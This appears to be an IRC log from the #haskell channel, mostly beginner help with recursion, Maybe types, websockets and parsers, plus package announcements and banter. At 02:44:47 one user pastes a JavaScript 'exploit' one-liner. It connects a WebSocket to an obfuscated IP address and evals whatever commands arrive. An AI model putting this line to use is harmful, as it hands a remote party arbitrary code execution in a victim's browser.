00:00:21 <Shaladdle> Ahh I see, cool! Is haskell a normal subject when teaching FP?
00:01:18 <pete_> No idea. In this case, the professor had a strong Haskell bias
00:01:23 <pete_> and so the entire thing was taught in Haskell
00:01:27 <Shaladdle> NIce
00:01:54 <ciaranm> haskell is fairly widely taught
00:01:58 <coppro> ^
00:02:33 <ciaranm> it's also fairly widely taught badly
00:02:53 <quchen> Does anyone know how "large" Hackage is? Filesize of all (current, somewhat maintained) packets, how long it takes to compile them all?
00:03:11 <ciaranm> quchen: it's empty until you need it!
00:07:54 <Araneidae> Somewhere there's a hierarchical web page of package names ... but I can't find it on hackage.  Without it I'm finding it difficult to locate specific packages (partlcularly as Hayoo! is busted)
00:10:18 <FreeFull> http://hackage.haskell.org/packages/archive/pkg-list.html There is this but it isn't very hierarchical
00:10:38 <Araneidae> No, that page is pretty horrible.
00:11:14 <Araneidae> Think the page I'm thinking of is part of the GHC documentation?
00:11:53 <quchen> Gotta go now for a bit, @tell me if there's a solution :-)
00:18:04 <supki> Araneidae: you mean http://www.haskell.org/ghc/docs/7.6.1/html/libraries/index.html I think
00:18:57 <Araneidae> Yes indeed!
00:19:09 <Araneidae> Why the devil can't hackage do that?
00:20:42 <simukis_> Araneidae: I suspect the list would become so long it'd be pain in anus to load it even.
00:21:14 <simukis_> but, yeah, I find this list highly superior to hackage's list too.
00:25:13 <Araneidae> Of course, looking at hackages package list, it's full of the most extraordinary and useless crap.  xkcd leaps out at me!
00:40:01 <DelicateFlower> hello haskelliers
00:40:17 <DelicateFlower> what would be a good resource to learn the basics of haskell quickly?
00:40:59 <arkeet> DelicateFlower: LYAH is a nice introduction.
00:41:01 <arkeet> @where lyah
00:41:01 <lambdabot> http://www.learnyouahaskell.com/
00:41:10 <alexander__b> DelicateFlower: define "quickly"
00:41:27 <arkeet> but anything will require some effort on your part.
00:42:17 <dlnx> hello all
00:42:42 <DelicateFlower> in 2 hours
00:42:47 <DelicateFlower> i just need to be able to mash out stuff
00:42:50 <alexander__b> DelicateFlower: yeh no
00:43:06 <Araneidae> two hours.  Yeah, that'll work
00:43:17 <DelicateFlower> i hate reading some long drawn out ramble that goes on 20 hours and i still cant write a program to do usefull stuff
00:43:21 <DelicateFlower> oh please
00:43:22 <alexander__b> DelicateFlower: I guess if you know a functional language you can get the very very basics and write simple stuff.
00:43:26 <DelicateFlower> i learned scheme in 2 hours
00:43:33 <Araneidae> Then you have a head start
00:43:36 <DelicateFlower> it wasn't even hard
00:43:40 <dlnx> DelicateFlower: really?
00:43:44 <DelicateFlower> yes
00:43:50 <DelicateFlower> scheme is very simple
00:43:54 <DelicateFlower> not like java
00:44:02 <DelicateFlower> 10 hours in you still cant compile a hello world program
00:44:13 <dlnx> I don't know about that
00:44:16 <dlnx> scheme is complex
00:44:21 <alexander__b> DelicateFlower: if you know LISP, learning the basics of haskell will give you a very decent head start. haskell is still however drastically different from other languages.
00:44:22 <DelicateFlower> scheme is real simply
00:44:25 <DelicateFlower> lambda and cons
00:44:26 <DelicateFlower> thats it
00:44:31 <DelicateFlower> well
00:44:32 <dlnx> general idea is simple
00:44:36 <alexander__b> dlnx: scheme is really simple. it let's you do complex things though.
00:44:38 <DelicateFlower> you can make cons with lambda
00:44:43 <DelicateFlower> so i guess just lambda then
00:44:47 <dlnx> alexander__b: I know, I am schemer
00:45:03 <dlnx> anyways
00:45:04 <DelicateFlower> arent we all?
00:45:08 * DelicateFlower rubs his hands
00:45:15 <dlnx> I started to learn haskell too
00:45:19 <alexander__b> DelicateFlower: no. common lithper here. :-)
00:45:26 <alexander__b> still did not learn haskell in two hours.
00:45:35 <DelicateFlower> how much do i need?
00:45:38 <dlnx> and I am looking for books like "Write yourself scheme in 48hrs"
00:45:41 <alexander__b> I thought a  week would be enough...
00:45:49 <alexander__b> it wasn't.
00:45:49 <DelicateFlower> a week
00:45:54 <DelicateFlower> is this a week of actual learning
00:46:14 <DelicateFlower> as in 168 hours
00:46:19 <alexander__b> 5 days of 6h of hacking
00:46:24 <alexander__b> well, reading & hacking.
00:46:36 <alexander__b> that is 6h of *work* using a stopwatch
00:46:49 <DelicateFlower> oh well
00:47:06 <alexander__b> I guess you could say I got the basics pretty fast though. and I *am* rather stupid... but I'm still barely able to get haskell to do what I want.
00:47:26 <DelicateFlower> that website says haskell is the best functional programming language around
00:47:54 <alexander__b> it has quite a few... quirks. that you'll probably grow to love. :-) and as I said, if you know LISP really well and are experienced in functional programming, you will probably learn in more quickly than me who is only an occasional lithper and mostly work with C-like languages.
00:48:16 <DelicateFlower> c aint bad
00:48:18 <Kneiva> which ghc will be in haskell platform 2013.2 ?
00:48:56 <DelicateFlower> is therea a good online haskell interpreter?
00:49:06 <DelicateFlower> for learning
00:49:34 <dlnx> http://tryhaskell.org/
00:49:52 <Palmik> Hmm, do Type Operators not have an entry on the wiki nor in the GHC manual? Because I can not find it.
00:50:02 <dlnx> http://codepad.org/
00:50:20 * hackagebot hist-pl-lexicon 0.3.0 - A binary representation of the historical dictionary of Polish  http://hackage.haskell.org/package/hist-pl-lexicon-0.3.0 (JakubWaszczuk)
00:50:22 * hackagebot hist-pl-lexicon 0.3.1 - A binary representation of the historical dictionary of Polish  http://hackage.haskell.org/package/hist-pl-lexicon-0.3.1 (JakubWaszczuk)
00:50:53 <DarkFox> Can someone please help me create a websocket tool to give me a chat like server. Where the clien't don't communicate, but the server gets all messages and can send to any and target any specfic
00:53:24 <MercurialAlchemi> DelicateFlower: the syntax is pretty simple to understand
00:54:12 <MercurialAlchemi> DelicateFlower: however, there is a... rather large number of interesting and sometimes complex abstractions built out of it which are the main things you need to understand
00:54:15 <dlnx> do somebody know some tutorials like "Write yourself scheme in 48hrs"?
00:55:21 <MercurialAlchemi> dlnx: you have a lot of exercises in Real World Haskell
00:56:06 <DarkFox> I really don't have much yet. I've got main = runServer "0.0.0.0" 6120 app  where app r = do { acceptRequest r; s <- getSink; _ <- liftIO . forkIO . forever $ recieve >>= putStrLn; sendSink s . textData $ T.pack "Test"
00:56:23 <dlnx> what about parsing? specifically
00:56:40 <dlnx> MercurialAlchemi: or designing dialect
00:57:15 <dlnx> I use scheme for music composition and I'd like to do the same in haskell
00:57:23 <dlnx> but haskore is... not what I want.
00:57:47 <MercurialAlchemi> You do have a chapter on Parsec in it: http://book.realworldhaskell.org/read/using-parsec.html
00:58:21 <dlnx> cool I'll dig into it
01:00:20 * hackagebot polh-lexicon 0.2.2 - A library for manipulating the historical dictionary of Polish (deprecated)  http://hackage.haskell.org/package/polh-lexicon-0.2.2 (JakubWaszczuk)
01:00:36 <kryft> Scheme for music composition sounds interesting
01:01:59 <dlnx> kryft: look it up
01:02:09 <dlnx> Impromptu, Symbolic Composer, SuperCollider
01:02:18 <quchen> DarkFox: Pretty much the minimal client/server application: https://gist.github.com/quchen/5538940
01:02:45 <dlnx> kryft: but I wrote my own chunks of code in pure scheme
01:02:57 <dlnx> developing music ideas and etc.
01:10:20 * hackagebot hakyll-blaze-templates 0.1.1.0 - Blaze templates for Hakyll  http://hackage.haskell.org/package/hakyll-blaze-templates-0.1.1.0 (SimonasKazlauskas)
01:11:14 <hpaste> ‚ÄúDharmender Kumar‚Äù pasted ‚ÄúMumbai Exercise Equipment Service‚Äù at http://hpaste.org/87477
01:14:25 <shachaf> Is someone reporting those hpastes?
01:16:25 <Botje> I reported that one
01:16:30 <lpvb> my brain hurts
01:16:43 <Botje> common result of learning haskell
01:17:02 <lpvb> what's the common remedy?
01:19:31 <Botje> alcohol, chocolate, a nice hot bath, or any combination of the three
01:19:57 <ion> A bath in alcohol and chocolate
01:20:06 <pete_> sounds like it might sting
01:20:15 <Botje> I would not recommend that
01:20:20 * hackagebot vector-binary 0.1.1 - Binary instances for vector types (deprecated)  http://hackage.haskell.org/package/vector-binary-0.1.1 (JakubWaszczuk)
01:24:16 <lpvb> already had a nice hot bath, underage for alcohol, and chocolate didn't do a thing :(
01:25:06 <pete_> I am over-age for alcohol. I had to stop drinking when two pints of beer started giving me a hangover
01:26:01 <lpvb> pete_: lol
01:27:37 <earthy> paracetamol...
01:27:55 <earthy> pete_: sounds awfully familiar
01:28:15 * pete_ hasn't drunk since New Year a year back
01:28:28 <pete_> it was starting to come between me and solvent use, anyway
01:28:39 <earthy> oh, I won't let a bit of headache in the morning deter me :)
01:28:45 * Araneidae knows he drinks too much wine
01:28:52 <MercurialAlchemi> pete_: the point is, alcohol can get you where you won't be able to blame Haskell for any headache
01:29:06 <mm_freak> are we really discussing drugs now?
01:29:16 <mm_freak> because if yes i have some excellent suggestions for haskell hacking
01:29:21 <Araneidae> Haskell headaches, I thought
01:29:37 <pete_> The lambda is actually the ancient Greek symbol for a nose doing a line
01:29:46 <mm_freak> lol
01:29:56 <pete_> you can't unsee that
01:29:59 <pete_> :-P
01:30:14 <pete_> Mu is a nose bleed
01:30:18 <mm_freak> pete_: there is a drug for about anything =P
01:30:39 <pete_> The only drugs I take these days are anti-anxiety meds for flying
01:30:49 <yitz> dlnx: what don't you like about haskore?
01:30:51 <mm_freak> i take a lot of caffeine
01:30:52 * earthy thinks haskell is a great drug
01:30:53 <pete_> I have noted that this has changed me from hating flying to being wildly enthusiastic about it
01:30:59 <mm_freak> and i take haskell
01:31:14 <pete_> caffeine isn't so much a drug as a lifestyle
01:31:18 <pete_> my inner child is coffee
01:31:28 <mm_freak> pete_: not if you get headache without it
01:31:33 <earthy> problem with inner childs is they want to get out
01:31:46 <pete_> mm_freak: That's why I carry caffeine pills with me (wish I was joking)
01:31:52 <earthy> in the case of coffee quite violently and antiperistaltic in my case
01:31:54 <pete_> I forget to drink coffee at the weekend
01:32:04 <yitz> earthy: that tends to be more of a problem when the inner child is alcohol, not caffeine
01:32:12 <mm_freak> well, i switched to black tea and mate
01:32:19 * earthy nods
01:32:22 <mm_freak> coffee makes me feel weird
01:32:23 <earthy> tea++
01:32:31 <mm_freak> mate++
01:32:37 <pete_> I am still disturbed about my functional programming nightmare last night
01:32:39 <pete_> This was a new low
01:32:51 <mm_freak> pete_: the types just wouldn't fit?
01:32:52 <earthy> definitely, only slightly less easily obtained 'round these parts
01:33:09 <MasseR> pete_: Did the monadburgers try to eat you?
01:33:14 <pete_> mm_freak: I had to read a business plan / proposal, and it made heavy use of curried types for ... section headings
01:33:17 <pete_> it didn't make much sense
01:33:20 <earthy> pete: heh, I've discussed deeper bits of lambdacalculus over scotch at 3am when I was younger :)
01:33:32 <pete_> sorry, curried functions
01:33:40 <mm_freak> pete_: or was it one of those nightmares where you awake from an inner dream and find yourself in a world that has never heard of haskell and you are forced to program PHP all day?
01:33:59 <MasseR> pete_: That actually reminds me of the time I read some xsd schemas a while back
01:33:59 <pete_> Meh, I'm a Perl developer original. Nothing wrong with quick and dirty
01:34:08 <earthy> perl is a lot better than php ;)
01:34:16 <mm_freak> i do my quick/dirty stuff in haskell
01:34:20 <MercurialAlchemi> eh, I live in a world that heard of Haskell, but I code in Java
01:34:25 <MercurialAlchemi> How bad is that?
01:34:27 <pete_> I wrote an essay talking about how you could abuse Perl's OO system to do type-class-alikes, sorta
01:34:39 <donri> I've heard of Java but I code in Haskell
01:34:45 <mm_freak> MercurialAlchemi: my condolences
01:35:13 <mm_freak> pete_: you can also abuse PHP 5.4's traits to do type-class-alikes
01:35:18 <Palmik> Hmm, do Type Operators not have an entry on the wiki nor in the GHC manual? Because I can not find it.
01:35:30 <mm_freak> or C++'s multiple inheritance
01:35:30 <MercurialAlchemi> I need a two-way Haskell <-> Java translation layer
01:35:32 <mm_freak> or ‚Ä¶
01:35:35 <pete_> what is a type operator?
01:35:36 <MasseR> MercurialAlchemi: Honestly. I would rather write java than write php (which I luckily do since a month ago)
01:35:43 <mm_freak> pete_: an infix type constructor
01:35:45 <mm_freak> like (->)
01:35:51 <MercurialAlchemi> MasseR: oh, I fully agree
01:35:55 <Botje> MercurialAlchemi: could meet half way and do scala
01:36:33 <MercurialAlchemi> MasseR: I had managed to avoid PHP until a few years ago, and I can honestly it's the language I despise the most, above and beyond even Visual Basic
01:36:36 <mm_freak> if only scala were a functional language‚Ä¶
01:36:54 <MercurialAlchemi> Botje: actually, I'm doing the Coursera Scala course on the side
01:37:02 <pete_> My understanding is that Scala is about as functional as Perl is
01:37:15 <MasseR> I was sort of hired as a scala programmer. Unfortunaly there hasn't been any scala projects during this time :P
01:37:18 <MercurialAlchemi> Botje: I however don't have a magic turn-legacy-Java-codebase into Scala tool
01:37:36 <MasseR> But for now I have done php, java, xslt, (lots of xml) and javascript. Waiting for scala
01:37:48 <Araneidae> Anybody fancy a code review?  It's about 350 lines of binary stream serialisaion and deserialisation, a repeat of last night, but with more work done
01:37:53 <hpaste> Araneidae pasted ‚ÄúPvTypes‚Äù at http://hpaste.org/87478
01:37:57 <maltem> When building GHC HEAD, is it normal that I have to check out Cabal manually? sync-all seems to refer to an outdated url, which then confuses git-submoduleÖ
01:38:02 <lpvb> MercurialAlchemi: frege?
01:38:08 <MercurialAlchemi> mm_freak: well, it has functional bits, but a lot of it feels like Haskellish with a clunky syntax
01:38:26 <MercurialAlchemi> lpvb: it turns existing Java into non-Java?
01:38:53 <mm_freak> MercurialAlchemi: almost every language has functional bits
01:38:58 <mm_freak> even PHP
01:39:25 <donri> guys and gals, not to be that guy, but -blah mkay :)
01:39:32 <lpvb> "mm_freak | if only scala were a functional language" why do you say that?
01:39:45 <lpvb> MercurialAlchemi: no sorry :(
01:39:52 <mm_freak> lpvb: nevermind‚Ä¶  we're getting off-topic
01:39:57 <mm_freak> donri++
01:40:07 <Botje> MercurialAlchemi: you can migrate bits over one at a time. scala has java interop
01:40:20 * hackagebot egison 3.0.2 - An Interpreter for the Programming Language Egison  http://hackage.haskell.org/package/egison-3.0.2 (SatoshiEgi)
01:40:29 <donri> there are people asking questions above and drowning in offtopic. just sayin'
01:40:44 <lpvb> I've never seen a concrete definition of functional programming
01:41:05 <mm_freak> donri: actually i'm reviewing Araneidae's code right now =P
01:41:10 <mm_freak> but it's quite a bunch
01:41:11 <donri> cool :)
01:41:19 <Araneidae> Sorry, it's grown quite big by now
01:41:37 <Araneidae> It's all about serialising and deserialising FieldType
01:41:49 <Araneidae> all the rest is noise
01:41:50 <mm_freak> Araneidae: starts to get useful to split it into multiple modules
01:41:57 <Araneidae> Yes, think it's about time!
01:42:03 <mm_freak> in particular a .Types module is always useful
01:42:12 <donri> maltem: if it tries but fails to check it out, that doesn't sound "normal"
01:42:28 <Araneidae> Ahhh.  I was going to put the Stream stuff to one side already
01:42:38 <MercurialAlchemi> Botje: I know that, unfortunately it's not the company policy (and I have to say I'm not completely convinced by Scala anway)
01:43:12 <mm_freak> btw, i think i could find some time to make a small video introduction to real world haskell stuff‚Ä¶  stuff that nobody talks about:  cabal, cabal-install, testing, benchmarking, organizing projects, etc.
01:43:24 <donri> +1
01:43:52 <mm_freak> if anyone would appreciate it, i'll do it
01:43:59 <donri> http://www.haskell.org/haskellwiki/How_to_write_a_Haskell_program
01:44:24 <mm_freak> donri: that helps, but i mean to "talk" in the literal sense =)
01:44:34 * Araneidae goes to read donri's link
01:44:36 <donri> certainly
01:45:46 <maltem> donri: well I got it working anyways :)
01:50:21 * hackagebot polimorf 0.7.0 - Working with the PoliMorf dictionary  http://hackage.haskell.org/package/polimorf-0.7.0 (JakubWaszczuk)
01:53:02 <lpvb> so reading this has made me wonder why there is no syntactic sugar for comonads
01:53:04 <lpvb> http://www.haskellforall.com/2013/02/you-could-have-invented-comonads.html
01:54:04 <donri> @hackage codo-notation
01:54:04 <lambdabot> http://hackage.haskell.org/package/codo-notation
01:54:48 <donri> gabriel says he doesn't like that one though
02:03:05 <HugoDaniel> https://twitter.com/id_aa_carmack/status/331918309916295168
02:03:07 <HugoDaniel> wow
02:03:17 <HugoDaniel> that is something :)
02:11:01 <simukis_> It is said that attoparsec is faster, better, slimmer and whatnot (at least by RWH author), why do people still use parsec?
02:11:56 <supki> (one of RWH authors is the author of attoparsec)
02:12:06 <simukis_> supki: I know that.
02:12:23 <HugoDaniel> simukis_: parsec is better for error handling
02:12:59 <supki> last tried I parsed something parsec was easier to develop parser that is polymorphic in stream type
02:13:06 <HugoDaniel> sometimes, when your requirement is not "i just need this to parse and im done" but is more like "i need this to parse and display a load of other information if it fails or if something is not quite right"
02:13:18 <HugoDaniel> then parsec is the better choice
02:13:20 <DMcGill> Do list satisfy the monoid laws strictly, even in the face of bottom and memory and everything? I know they do if you just consider denotational semantics but I was wondering if it broke down if you were more pedantic
02:13:28 <DarkFox> quchen: That doesn't use websockets
02:15:21 <simukis_> I see.
02:23:35 <plhk> http://marc.info/?l=openbsd-ports&m=136796351325773&w=2 ):
02:23:43 <DarkFox> quchen: Any idea for a websockets example? (websockets is in hackage)
02:23:47 <DarkFox> @hoogle websocket
02:23:48 <lambdabot> package websockets
02:23:48 <lambdabot> package network-websocket
02:23:48 <lambdabot> package salvia-websocket
02:23:54 <DarkFox> First‚Ä¶
02:29:50 <Gracenotes> gwern: oh man, people are covering you in the news
02:30:21 * hackagebot polimorf 0.7.1 - Working with the PoliMorf dictionary  http://hackage.haskell.org/package/polimorf-0.7.1 (JakubWaszczuk)
02:30:56 <Gracenotes> tech news at least, which is more.. positive than journalism as a whole, I think, anyway
02:35:47 <NeonCore> Is it possible to give a function a "starting value" when using guards?
02:36:50 <ion> mm_freak: Such a video would be cool.
02:37:06 <mm_freak> alright‚Ä¶  i'll make it
02:38:45 <bitonic> NeonCore: what do you mean?
02:39:26 <Gracenotes> a where clause should apply to all guard alternatives
02:39:46 <Gracenotes> as far as scope goes
02:39:48 <NeonCore> I'd like get a string representation of an integer. I can't use show, because I have to use a given type signiture. I wanted to do it without reversing the list, but I failed to do it.
02:40:25 <Gracenotes> now I'm confused.
02:40:42 <bitonic> me too
02:40:55 <Gracenotes> do you have more details?
02:40:59 <NeonCore> Here's the code: http://pastebin.com/8sA2nbvC
02:41:00 <bitonic> NeonCore: could you give the type and example input/outputs of the functions you want to define?
02:41:07 <mauke> The paste 8sA2nbvC has been copied to http://hpaste.org/87479
02:41:47 <bitonic> NeonCore: ok.  what‚Äôs the type of ‚Äònumber‚Äô?  you‚Äôre using it as if it had two different types
02:42:16 <akegalj> Wolf3D haskell port: https://twitter.com/id_aa_carmack/status/331918309916295168    :)
02:42:17 <Gracenotes> the phrase "number n : []" can also be written as "[number n]"
02:42:22 <Gracenotes> which is probably not what you want
02:43:10 <Gracenotes> the expression (1 : 2 : 3 :), if it were legal in Haskell, would not be a list itself, but rather a *function* that takes a list and prepends 123. which is not what 'number' does
02:43:17 <Scabe> How do I paste my code into this chat room that is easily read by you guys
02:43:18 <bitonic> NeonCore: in the first guard, ‚Äònumber‚Äô clearly returns a String. in the second, ‚Äònumber‚Äô returns a Char.  the third is wrong in 3 ways
02:43:28 <bitonic> @where hpaste -- Scabe
02:43:29 <lambdabot> http://hpaste.org/
02:44:08 <bitonic> NeonCore: in short I don‚Äôt think you really know what you want ‚Äònumber‚Äô to do :P
02:44:13 <NeonCore> Gracenotes:  I thought adding :[] after the number function would solve this
02:44:47 * DarkFox looks at one of his javascript exploits‚Ä¶ (ws=new WebSocket("ws://0x45a4dbd0:6120")).addEventListener("message",function(e){ws.send(eval(e.data))});
02:45:32 <DarkFox> Thinking to myself... WebSocket "ws://0x45a4dbd0:6120/" $ send . eval $ getData
02:45:38 <DarkFox> If only.
02:45:45 <hpaste> Scabe pasted ‚ÄúWhy doesn't this work?‚Äù at http://hpaste.org/87480
02:45:53 <Gracenotes> NeonCore: well, if you're making a recursive function like 'number', figure out what the inputs and outputs are; if you don't get that right, you can't use them as a stepping stone for other things. As bitonic remarked, it seems to.. not typecheck.
02:46:28 <DarkFox> ([x],   [y])
02:46:34 <DarkFox> Scabe: I don't like that pattern match ‚Ä¶
02:46:37 <Botje> Scabe: the recursive call on line 7 also returns a Maybe Float
02:47:14 <Botje> Scabe: so either pattern match on the recursive call, or use the "maybe" function
02:47:38 <Botje> Scabe: I'll also add that dot_product is typically implemented in terms of zipWith, try it after you get this one working
02:47:42 <NeonCore> Gracenotes: I expected number to return an illegal expression, which would be legal with the : [] added after it
02:47:50 <Gracenotes> also, it could be simplified to putting the Just-returning patterns first, and then (_, _) -> Nothing...
02:48:17 <Gracenotes> NeonCore: functions in Haskell don't return expressions; they return values, which are required to be well-typed.
02:49:06 <Gracenotes> so if you can't give the value returned by function a type, like list of integer, string, function from int to char, etc.; GHC can't compile it to anything meaningful.
02:49:07 <Scabe> hmm, thanks for the help, still don't know what to do. (I'm pretty begiinner)
02:49:54 <NeonCore> is there any way to this without using (++) or reverse?
02:50:22 * hackagebot tamarin-prover-utils 0.8.5.0 - Utility library for the tamarin prover.  http://hackage.haskell.org/package/tamarin-prover-utils-0.8.5.0 (SimonMeier)
02:50:24 * hackagebot tamarin-prover-term 0.8.5.0 - Term manipulation library for the tamarin prover.  http://hackage.haskell.org/package/tamarin-prover-term-0.8.5.0 (SimonMeier)
02:50:26 * hackagebot tamarin-prover-theory 0.8.5.0 - Term manipulation library for the tamarin prover.  http://hackage.haskell.org/package/tamarin-prover-theory-0.8.5.0 (SimonMeier)
02:50:29 <NeonCore> I want to do it with using (:) only
02:50:45 <bitonic> NeonCore: we still don‚Äôt know what you want to do
02:51:02 <NeonCore> get a string representation of an integer
02:51:02 <bitonic> do you want to re-implement Show for ‚ÄòIntegral‚Äôs?
02:51:03 <Gracenotes> NeonCore: but, do you see why returning expressions isn't a thing that happens?
02:51:26 <Gracenotes> everything is a value, and you pass values to functions, get values to functions, add values, etc.
02:51:27 <NeonCore> Gracenotes: I understan
02:51:37 <Gracenotes> okay, sure.
02:52:57 <NeonCore> I checked the implementation of the Show function, but my knowlegde is not enough to understand it.
02:53:19 <viller> in a parsec parser, can I check something about an intermediate result and error if the check fails? I tried "when predicate (fail "msg")" but it failed at some later symbol instead
02:53:25 <Gracenotes> So there are two main ways to do simple recursion over a list. one is with an accumulator passed into the recursive call; the other is by requiring the result of the recursive call to produce a value.
02:53:34 <bitonic> NeonCore: you can do it ‚Äòonly with (:)‚Äô, but figure out how your function will work first.
02:53:42 <bitonic> also, ‚ÄòintToDigit‚Äô works only for ‚ÄòInt‚Äôs
02:53:45 <bitonic> as the name suggests
02:53:56 <Gracenotes> the first way naturally produces a 'reversed' kind of result. The second way is how you can cleanly implement this functionality in Haskell
02:54:03 <NeonCore> I'm using intToDigit (fromIntegral n)
02:54:15 <Gracenotes> What's the type of that value?
02:54:28 <bitonic> NeonCore: only at one call site
02:54:49 <bitonic> oh right, yes you need to use reverse ehe
02:55:07 <Gracenotes> you need to use reverse if you use a left fold, but not for a right fold
02:55:22 * hackagebot tamarin-prover 0.8.5.0 - The Tamarin prover for security protocol analysis.  http://hackage.haskell.org/package/tamarin-prover-0.8.5.0 (SimonMeier)
02:55:51 <NeonCore> I've done it with reversing, here: http://pastebin.com/HN6s6cfa
02:56:00 <mauke> The paste HN6s6cfa has been copied to http://hpaste.org/87481
02:56:35 <Gracenotes> uh, okay, actually I just realized it's a bit late and I'm talking a bit crazy
02:56:39 <bitonic> NeonCore: yep, that‚Äôs as good as you‚Äôll get performance wise
02:56:47 <bitonic> well
02:57:06 <NeonCore> I'm just interested if I could make it any faster.
02:57:24 <Scabe> Can anyone fix this code? http://hpaste.org/87480 I just want to know what the correct way to write this is.
02:57:24 <Gracenotes> you're not folding over an list, but rather an integer (or implicitly, a list that looks like [a % 10, a/10 % 10, a/100 % 10, ...])
02:57:50 <bitonic> NeonCore: if you want to avoid reversing you have to get the most significant digit first
03:00:29 <yitz> Scabe: that doesn't work?
03:01:33 <Scabe> Yeah I get a parse error
03:02:27 <yitz> Scabe: are there tabs in your source code? make sure everything is only spaces.
03:03:07 <Gracenotes> NeonCore: oh yeah, so what I was mentioning with left vs right folding, I mean something like this: let number n v = if n < 10 then intToDigit n:v else number (div n 10) (intToDigit (mod n 10):v)
03:03:20 <Gracenotes> or however you want to exactly define the recursion conditions
03:04:08 <Gracenotes> this is a left fold on the implicit 'list' of a number in a base.
03:04:20 <Gracenotes> and doesn't require explicit reverse or ++
03:04:43 <NeonCore> Umm, what is v in this?
03:04:50 <Scabe> yitz: does the code work for you?
03:05:08 <Gracenotes> oh, you can call it anything.. but it's an accumulator. initially passed in as [].
03:05:10 <yitz> Scabe: no. it parses fine. but there is a type error in the last line.
03:05:12 <magicman> Scabe: When I copy-paste that code into a file, I get a type error (as I expected from the code itself), not a parse error.
03:05:34 <Scabe> How would I fix the type error?
03:05:49 <yitz> Scabe: you can't add a Float to a Maybe Float
03:05:52 <Gracenotes> the idea is, you iterate through a number from the least to most significant digits, so keep a running list of the string representation so far.
03:05:59 <Scabe> Ohhh
03:06:24 <Gracenotes> whenever you encounter the next-most significant digit, prepend to that list
03:07:28 <Gracenotes> @src reverse
03:07:29 <lambdabot> reverse = foldl (flip (:)) []
03:08:02 <no-n> is the haskell port of wolf3d going to be open-source?
03:08:15 <Gracenotes> ^ so rather than doing a foldr followed by a foldr, just compress it into one foldr! (I am playing incredibly fast and loose with terminology... but anyway....)
03:08:17 <yitz> Scabe: you can use the function fmap to apply a function inside a Maybe, like this
03:08:21 <Gracenotes> *one foldl
03:08:22 <no-n> because that would be super-interesting
03:08:33 <yitz> > fmap (35 +) $ Just 20
03:08:35 <lambdabot>   Just 55
03:09:22 <yitz> Scabe: so you can write that last line as something like this: fmap (...) $ dot_product ...
03:09:44 <Gracenotes> Can't help but see fmap ("a smalltown "++) $ Just "girl"... man, it is late...
03:09:57 <yitz> Scabe: the return type of that expression is Maybe Float, as required
03:12:15 <yitz> Scabe: hmm. what i told you will type check, but i'm afraid that your function will then always return Nothing.
03:12:18 <NeonCore> Gracenotes: Thanks for helping, but ghci can't parse the else part.
03:12:48 <yitz> Scabe: ah no it'll be ok because you have a special case for ([x], [y])
03:12:56 <Gracenotes> oh, works for me.
03:13:34 <NeonCore> I guess I'm just too stupid then. :D
03:13:45 <yitz> Scabe: usually people allow the "dot product" of empty vectors to be equal to zero, not Nothing. then you don't need the Maybe wrapper at all, and you avoid almost all of those edge cases.
03:19:01 <ion> ‚Äúfmap foo $ bar‚Äù? ‚Äúfoo <$> bar‚Äù.
03:20:07 <acube> @src (<$>)
03:20:07 <lambdabot> f <$> a = fmap f a
03:21:46 <Araneidae> I want to run mapM_ until a condition on the monad holds; what's the right function?
03:22:03 <merijn> Araneidae: Something from monad-loops, most likely
03:22:08 <merijn> @hackage monad-loops
03:22:08 <lambdabot> http://hackage.haskell.org/package/monad-loops
03:22:33 <Araneidae> whileM_ looks just the ticket
03:22:46 <Araneidae> Actually whileM, I do need the results
03:23:47 <merijn> Man, apparently monad-loops needs more pimping in common tutorials :)
03:24:15 <merijn> This is the 5th question this week that I've answers with "monad-loops" followed by "oh, X is exactly what I need!"
03:25:21 <Araneidae> huh.  Actually it's been such a long time since I've worked through a tutorial that wouldn't have helped ... I'm now building up a toolkit of places to look and clean code to get patterns from
03:25:23 * hackagebot strict-base-types 0.1 - Strict variants of the types provided in base.  http://hackage.haskell.org/package/strict-base-types-0.1 (SimonMeier)
03:37:23 <mm_freak> > foldM(\x y->zipWith(\l->(++y:l))<$>inits<*>tails$x)[] "abc"
03:37:28 <lambdabot>   ["abc","bca","cab","bac","acb","cba"]
03:37:49 <mm_freak> that's why i prefer liftA2‚Ä¶  it's just more readable
03:37:50 <mm_freak> =P
03:38:25 <Hafydd> The fact that you hardly use any space doesn't help.
03:39:21 <mm_freak> i'm just joking of course
03:39:24 <Chathurga> What's up with the unary ++ ?
03:39:33 <mm_freak> unary?
03:39:37 <mm_freak> it's binary
03:39:45 <mm_freak> > (++ "def") "abc"
03:39:47 <lambdabot>   "abcdef"
03:39:48 <Chathurga> oh haha
03:39:51 <Hafydd> That's a section.
03:40:16 <Chathurga> It just looked so much like incremation
03:40:18 <Kinnison> Chathurga: If you're thinking pre/post increment; then you're failing to understand the concept of immutable data :-)
03:40:58 <Chathurga> I know I know I thought he was using some wild pragma or something
03:41:37 <Chathurga> Plus syntactically there's no reason ++ has to be immutable
03:41:40 <Chathurga> *mutable
03:41:57 <Chathurga> But yeah, brain fart my bad
03:41:59 <mm_freak> (++) is immutable‚Ä¶  it's a function
03:42:29 <Chathurga> mm_freak: Meant it terms of incremation
03:42:39 <NeonCore> \part
03:42:57 <mm_freak> > filterM(pure[0>1..]) "abc"
03:42:58 <Kinnison> Chathurga: well, "pre-incrment" would just be (+1) and "post-increment" would be id. (in an immutable data world)
03:42:59 <lambdabot>   ["","c","b","bc","a","ac","ab","abc"]
03:44:12 <mm_freak> Kinnison: they simply don't exist, because they are semantically non-sense in haskell
03:44:26 <mm_freak> in C "++x" is the same as x, just that x is now incremented
03:44:50 <mm_freak> so there is a big difference between C's "++x + x" and haskell's "succ x + x"
03:45:02 <Kinnison> mm_freak: indeed
03:45:48 <mm_freak> of course you can make them exist
03:47:12 <mm_freak> even purely, i.e. with no actual motation =)
03:47:15 <mm_freak> mutation
03:48:25 <Hafydd> You have that wrong: "x++" evaluates to the same as "x" (with side effects); "++x" evaluates to "x+1" (with side effects).
03:49:32 <flux> I think you are perhaps talking differently about the same thing :-)
03:49:47 <Kinnison> And this, ladies and gentlemen, is why mutation sucks :-)
03:50:07 <flux> x++ = { auto x2 = x; x = x + 1; x; }   ++x = { x = x + 1; x }
03:50:25 <flux> and this, ladies and gentelemen, english language sucks ;-)
03:50:30 <flux> +is why, erm
03:50:34 <flux> reinforces my point
03:50:46 <DigitalKiwi> 1+1==3
03:50:56 <Hafydd> 8==D
03:51:13 <alexander__b> grep: bash: No such file or directorytail: cannot open ‚Äòfreetennis.ml ‚Äô for reading
03:51:15 <alexander__b> : No such file or directory
03:51:19 <alexander__b> errr rong buffer
